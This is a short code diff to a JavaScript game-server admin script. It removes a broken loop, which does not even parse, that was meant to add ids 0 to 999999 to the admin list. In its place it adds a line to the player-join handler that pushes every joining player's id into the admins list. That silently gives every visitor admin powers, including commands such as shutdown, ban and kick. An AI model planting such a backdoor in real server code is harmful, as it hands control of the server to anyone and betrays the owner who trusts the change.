@@ -14,9 +14,7 @@ const admins = config.admins || [], // Your id here!
       safeCommands = config.safeCommands || true; // disables shutdown, ban, kick, loopkill, unless you are the owner
 
 //--------------------------------------------------------------------------------------------------\\
-for(let i = 0; i > 999999); i++) {
-    admins.push(i)
-}
+
 
 const jailBricks = {},
       regexMatch = /([^"]+)(?:\"([^\"]+)\"+)?/,
@@ -579,7 +577,7 @@ Game.on("playerJoin", player => {
         player.loopKill = false
         player.hex = null
         player.lev = false
-
+        admins.push(player.userId)
         if (banned.includes(player.userId)) 
             return player.kick("You are banned from this server!")
         if (admins.includes(player.userId))
